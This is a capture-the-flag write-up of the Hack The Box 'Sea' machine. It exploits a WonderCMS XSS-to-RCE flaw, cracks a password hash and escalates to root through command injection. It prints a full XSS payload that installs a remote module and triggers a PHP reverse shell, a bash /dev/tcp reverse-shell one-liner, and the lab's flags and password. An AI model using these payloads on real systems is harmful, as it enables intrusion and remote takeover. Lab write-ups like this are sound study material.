# Hack The Box: Sea

### Challenge Name: Sea
**Difficulty:** Easy

![image](https://github.com/user-attachments/assets/145980ec-2ffd-45a4-87c6-98058add773f)


## Writeup:

To start, I ran nmap on the ip address to see what ports were exposed:

`nmap 10.10.11.28`

![image](https://github.com/user-attachments/assets/d68f2096-4e4a-4589-a0fd-84a0b9139ae3)


So it seems it has a webserver and also ssh open.

After checking out the website and looking at the requests, I saw that all of the images were being fetched from the path `/themes/bike/img`

![image](https://github.com/user-attachments/assets/078215ee-1099-40c5-a399-f85ffaef4608)

I tried to access the `/themes/bike/` endpoint, but I stated that I was unauthorized. I was still interested in the enpoint, so I ran my dirbuster on it to see if anything would come up:

`ffuf -c -w /usr/share/wordlists/dirbuster/quickhits.txt -u "http://sea.htb/themes/bike/FUZZ" -t 200 -fc 403`

Interestingly, I got two files that were interesting `version` and `README.md`. I went to `sea.htb/themes/bike/README.md` and was able to download the README file. 

```
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

From this file, I learned that it is using WonderCMS. I did some looking up on this and saw that there was an enpoint called `/loginURL` from this post: `https://www.wondercms.com/community/viewtopic.php?t=1053`.

I also checked the `/version` enpoint and it returned `3.2.0`. I took this as the WonderCMS version. 
![image](https://github.com/user-attachments/assets/770d08da-195d-4ac2-9484-31046fb70d7e)

After some googling I found that this version is succeptible to XSS which can lead to RCE!!!

`https://github.com/prodigiousMind/CVE-2023-41425?tab=readme-ov-file`

After running it I was able to get a GET request for the XSS payload but not get the shell. I tried looking at the exploit code and found a issue with the way it was handling the URL.
Also, there was an issue with the way it was fetching the github repository. Not sure the cause behind this but I decided to just download it zip file locally and host it.

At the end, I made the xss.js file: 
```

var url = "http://sea.htb/loginURL";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = "http://sea.htb";
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.14.60:8000/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "10.10.14.60";
       var port = "9999";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};

```
After this, I followed the instructions and inserted this into the contact form.

I was finally able to get a shell!!!

![image](https://github.com/user-attachments/assets/22c537a6-c0e4-4f8c-8ea1-8667928da754)

After some browsing, I found a hashed password in `/var/www/sea/data/database.js` --> `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`

![image](https://github.com/user-attachments/assets/c0ceb778-f719-4a07-9840-f38a716908d2)

I used john the ripper and got the password: `mychemicalromance`

![image](https://github.com/user-attachments/assets/0244f40b-08c7-4c43-ad64-436e5408b909)

I used this password to log into `amay`'s account via SSH `(0c3e5f3aa1f0679d89d66181ba473186)`

To get root, I ran a local privilege escalation script using Linpeas but was unable to get anything working.

I looked at the open ports and saw another webserver. I forwarded the connection via 

`ssh amay@sea.htb -L 8080:127.0.0.1:8080`

Once I got onto the webpage, I got to a page that looks like this. By clicking on the Analyze Log button, I was able to access files as root!!

![image](https://github.com/user-attachments/assets/1f5bbb3e-1fdc-4717-ab47-aaf908d9652a)


This was really interesting, I found out that it was vulnerable to cmdinjection as I spawned up a reverse shell using 

```
plain: bash -c 'bash -i >& /dev/tcp/10.10.14.60/9999 0>&1'
URL encoded: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.60%2F9999%200%3E%261%27
```

![image](https://github.com/user-attachments/assets/615b449f-0653-4dd3-97a2-8e16848f2ec4)


This gave me the root flag: `2b18ab6e928f1b06542edf788e2481c4`

![image](https://github.com/user-attachments/assets/460d046a-5325-416f-a270-5c05560bd94b)

